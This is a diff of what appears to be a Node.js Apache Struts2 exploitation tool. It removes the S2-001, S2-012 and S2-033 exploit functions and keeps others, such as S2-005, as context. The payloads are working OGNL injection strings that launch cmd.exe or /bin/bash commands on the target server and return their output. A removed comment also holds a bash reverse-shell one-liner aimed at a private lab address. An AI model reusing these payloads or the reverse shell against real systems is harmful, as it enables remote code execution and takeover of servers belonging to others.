@@ -252,18 +252,6 @@ function DoSpringBoot(url)
     });
 }
 
-// s2033_poc = "/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23parameters.content[0]%2b602%2b53718),%23wr.close(),xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=2908"
-function doStruts2_033(url)
-{
-	var szOldUrl = url;
-	url = url.substr(0, url.lastIndexOf('/') + 1) + encodeURIComponent(g_postData) + ",mtx.toString.json?ok=1";
-	request(fnOptHeader({method: 'POST',uri: url}),
-    	function(e,r,b)
-    {
-    	fnDoBody(b,"s2-033",szOldUrl);
-    });
-}
-
 function myLog(a)
 {
 	/*
@@ -299,43 +287,10 @@ function fnNotEnd(url)
 	return url;
 }
 
-// http://192.168.10.216:8088/S2-001/login.action
-// bash -i >& /dev/tcp/192.168.24.90/8080 0>&1
-function doStruts2_001(url)
-{
-	var szOldUrl = url;
-	url = fnNotEnd(url);
-	this.name = this.name || "username";
-	var s = ('%{#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\')),#cmds=(#iswin?{\'cmd.exe\',\'/c\',\'' + g_szCmdW + '\'}:{\'/bin/bash\',\'-c\',\'' + g_szCmd + '\'}),#a=(new java.lang.ProcessBuilder(#cmds)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse")'
-		+',#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000]'
-		+ ',#wt=#f.getWriter()'
-		+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
-		+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
-		+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
-		+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
-		+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
-		+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
-		+ ',#wt.flush()'
-		+',#wt.close()}');
-
-	request(({method: 'POST',uri: url 
-		,body:this.name + "=" + encodeURIComponent(s) + "&password="
-		,headers:
-	    {
-	    	"user-agent": g_szUa,
-	    	"content-type":"application/x-www-form-urlencoded"
-	    }}),
-    	function(e,r,b)
-    {
-    	// console.log(b);
-    	fnDoBody(b,"s2-001,s2-012",szOldUrl);
-    });
-}
-
 function doStruts2_005(url, fnCbk)
 {
 	var szOldUrl = url;
-	url = fnNotEnd(url);
+	url = fnNotEnd(url)
 	var s = ('%{#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\')),#cmds=(#iswin?{\'cmd.exe\',\'/c\',\'' + g_szCmdW + '\'}:{\'/bin/bash\',\'-c\',\'' + g_szCmd + '\'}),#a=(new java.lang.ProcessBuilder(#cmds)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse")'
 		+',#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000]'
 		+ ',#wt=#f.getWriter()'
@@ -670,45 +625,7 @@ function doStruts2_009(url, fnCbk)
 	    }
 	  );
 }
-/*
-如果在配置 Action 中 Result 时使用了重定向类型，并且还使用 ${param_name} 作为重定向变量
-<result name="redirect" type="redirect">/index.jsp?name=${name}</result>
-*/
-function doStruts2_012(url, fnCbk)
-{
-	var s = "%{#_memberAccess[\"allowStaticMethodAccess\"]=true,#mtx=new java.lang.Boolean(\"false\"),#context[\"xwork.MethodAccessor.denyMethodExecution\"]=#mtx"
-	+ ",#iswin=(@java.lang.System@getProperty(\"os.name\").toLowerCase().contains(\"win\"))"
-	+ ",#cmds=(#iswin?{\"cmd.exe\",\"/c\",\"" + g_szCmdW + "\"}:{\"/bin/bash\",\"-c\",\"" + g_szCmd + "\"})"
-	+ ",#p=new java.lang.ProcessBuilder(#cmds)"
-	+ ",#as=new java.lang.String()"
-	+ ",#p.redirectErrorStream(true),#process=#p.start()"
-	+ ",#b=#process.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000]"
-	+ ",#i=#d.read(#e),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
-	+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
-	+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
-	+ ",#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\").getWriter()"
-	+ ",#f.println(#as)"
-	+ ",#f.flush()"
-	+ ",#f.close()"
-	+"}";
-	this.name = this.name || "name";
-	var oForm = {};
-	oForm[this.name] = s;
-	request(fnOptHeader({method: 'POST',uri: url
-	    ,"formData":oForm
-	    ,headers:
-	    {
-	    	"User-Agent": g_szUa,
-	    	"Content-Type":"application/x-www-form-urlencoded"
-	    }})
-	  ,function (error, response, body){
-	  		if(body)
-	  		{
-	  			fnDoBody(body,"s2-012",url);
-	  		}
-	    }
-	  );
-}
+
 /*
 Struts2 标签中 <s:a> 和 <s:url> 都包含一个 includeParams 属性，其值可设置为 none，
 get 或 all，参考官方其对应意义如下：
@@ -1190,7 +1107,7 @@ function fnMyPut(url)
 // https://github.com/Medicean/VulApps/tree/master/s/struts2
 function fnTestStruts2(szUrl2, obj)
 {
-	var a = [doStruts2_001,doStruts2_007,doStruts2_009,doStruts2_012,doStruts2_013,doStruts2_029,doStruts2_048,doStruts2_053], fnGetCpy = function()
+	var a = [doStruts2_007,doStruts2_009,doStruts2_013,doStruts2_029,doStruts2_048,doStruts2_053], fnGetCpy = function()
 	{
 		var o = {name:null};
 		if(!obj)return o;
@@ -1209,7 +1126,7 @@ function fnTestStruts2(szUrl2, obj)
 	{
 		if("fnction" == typeof global["doStruts2_" + a[k]])
 			global["doStruts2_" + a[k]](szUrl2);
-		else runChecks(szUrl2,"struts2," + a[k]);
+		else runChecks(szUrl2,"struts2," + a[k],null,{x:34});
 	}
 	// doStruts2_020(g_szUrl);
 	// doStruts2_052(szUrl2);
@@ -1295,10 +1212,10 @@ if(program.test)
 	doStruts2_048(g_szUrl);
 	//*/
 	//*
-	doStruts2_001.call({name:null},"http://192.168.10.216:8088/S2-001/login.action");
+	// doStruts2_001.call({name:null},"http://192.168.10.216:8088/S2-001/login.action");
 	doStruts2_007.call({name:null},"http://192.168.10.216:8088/S2-007/user.action");
 	doStruts2_008.call({name:null},"http://192.168.10.216:8088/S2-008/devmode.action");
-	doStruts2_012.call({name:null},"http://192.168.10.216:8088/S2-012/user.action");
+	// doStruts2_012.call({name:null},"http://192.168.10.216:8088/S2-012/user.action");
 	doStruts2_013.call({name:null},"http://192.168.10.216:8088/S2-013/link.action");
 	doStruts2_015.call({name:null},"http://192.168.10.216:8088/S2-015/");
 	doStruts2_016.call({name:null},"http://192.168.10.216:8088/S2-016/default.action");
@@ -1311,15 +1228,6 @@ if(program.test)
 	doStruts2_053.call({name:null},"http://192.168.10.216:8082/s2-053/");
 	///////////*/
 }
-module.exports = {"doStruts2_001":doStruts2_001};
-var kk = this;
-for(var k in kk)
-{
-	if("function" == typeof kk[k])
-		console.log(k);
-	// else console.log(kk[k]);
-}
-
 /*
 var a = fs.readFileSync("./nwTomcat.txt").toString().trim().split("\n");
 for(var k in a)
